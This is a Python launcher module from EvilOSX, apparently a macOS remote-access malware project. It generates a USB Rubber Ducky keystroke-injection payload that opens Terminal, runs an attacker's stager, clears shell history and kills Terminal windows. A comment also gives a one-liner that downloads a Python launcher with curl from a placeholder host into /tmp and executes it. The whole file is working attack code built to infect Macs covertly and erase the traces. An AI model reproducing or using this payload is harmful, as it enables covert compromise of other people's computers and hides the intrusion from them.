# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from bot.launchers.helper import LauncherABC
from textwrap import dedent


class Launcher(LauncherABC):
    def generate(self, stager):
        return ("txt", dedent("""\
        REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
        REM Also see https://ducktoolkit.com/vidpid/
        REM If timing is important, the following is a lot faster:
        REM STRING cd /tmp; curl -s HOST_TO_PYTHON_LAUNCHER.py -o 1337.py; python 1337.py; history -cw; clear
        
        DELAY 1000
        GUI SPACE
        DELAY 500
        STRING Termina
        DELAY 1000
        ENTER
        DELAY 1500
        
        REM Kill all terminals after x seconds
        STRING screen -dm bash -c 'sleep 6; killall Terminal'
        ENTER
        
        REM Run the stager
        STRING {}; history -cw; clear
        ENTER
        """.format(stager)))
